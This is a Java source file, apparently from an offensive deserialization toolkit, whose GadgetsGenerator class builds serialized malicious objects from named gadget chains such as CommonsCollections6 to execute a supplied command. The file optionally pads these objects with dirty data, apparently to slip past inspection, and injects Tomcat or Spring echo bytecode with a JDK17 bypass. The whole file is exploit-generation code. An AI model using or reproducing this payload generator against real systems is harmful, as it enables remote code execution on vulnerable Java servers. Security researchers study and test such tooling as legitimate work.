package com.xyuxu.javasec.core.generator;

import com.xyuxu.javasec.core.payload.gadgets.BytecodePayload;
import com.xyuxu.javasec.core.payload.gadgets.ObjectPayload;
import com.xyuxu.javasec.utils.DirtyDataWrapper;
import com.xyuxu.javasec.utils.PayloadUtils;
import com.xyuxu.javasec.utils.Serializer;

public class GadgetsGenerator {

    /**
     * 通用的 Payload 生成方法
     * @param gadgetType  利用链名称 (e.g. "CommonsCollections6")
     * @param command     要执行的命令
     * @param useDirtyData 是否添加脏数据
     * @return 序列化后的字节数组
     * @throws Exception 生成过程中的异常
     */
    public static byte[] generateBytes(String gadgetType, String command, boolean useDirtyData) throws Exception {
        ObjectPayload<?> payload = null;
        Object evilObject = null;

        try {
            // 1. 获取 Payload 类
            final Class<? extends ObjectPayload> payloadClass = PayloadUtils.getPayloadClass(gadgetType);
            if (payloadClass == null) {
                throw new Exception("找不到Payload类: " + gadgetType);
            }

            // 2. 实例化并生成恶意对象
            payload = payloadClass.getDeclaredConstructor().newInstance();
            evilObject = payload.getObject(command.trim());

            // 3. 处理脏数据
            if (useDirtyData) {
                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(evilObject, 20000);
                evilObject = dirtyDataWrapper.doWrap();
            }

            // 4. 序列化
            return Serializer.serialize(evilObject);

        } finally {
            // 资源释放
            if (payload != null && evilObject != null) {
                PayloadUtils.releasePayload(payload, evilObject);
            }
        }
    }


    /**
     *
     * @param gadgetType   利用链名称 (e.g. "CommonsCollectionsK1")
     * @param echoType     回显类型 (e.g. "TomcatEcho", "SpringEcho")
     * @return 序列化后的字节数组
     */
    public static byte[] generateEchoBytes(String gadgetType, String echoType) throws Exception {
        BytecodePayload<?> payload = null;
        Object evilObject = null;

        try {
            // 1. 获取 Payload 类
            Class<?> payloadClassRaw = PayloadUtils.getPayloadClass(gadgetType);
            if (payloadClassRaw == null) {
                throw new Exception("找不到Payload类: " + gadgetType);
            }
            if (!BytecodePayload.class.isAssignableFrom(payloadClassRaw)) {
                throw new Exception("该 Gadget [" + gadgetType + "] 不支持字节码加载 (BytecodePayload)");
            }
            boolean bypassJDK17 = false;
            if (gadgetType.toLowerCase().contains("springjackson")) {
                bypassJDK17 = true;
            }
            // 2. 获取回显字节码
            byte[] echoCode = EchoByteCodeGenerator.getBytecode(echoType, bypassJDK17);
            if (echoCode == null || echoCode.length == 0) {
                throw new Exception("找不到回显字节码或生成失败: " + echoType);
            }
            // 3. 实例化并生成恶意对象
            Class<? extends BytecodePayload> payloadClass = (Class<? extends BytecodePayload>) payloadClassRaw;
            payload = payloadClass.getDeclaredConstructor().newInstance();
            // 注入字节码
            evilObject = payload.getObjectWithBytecode(echoCode);
            return Serializer.serialize(evilObject);
        } finally {
            // 资源释放
            if (payload != null && evilObject != null) {
            }
        }
    }






}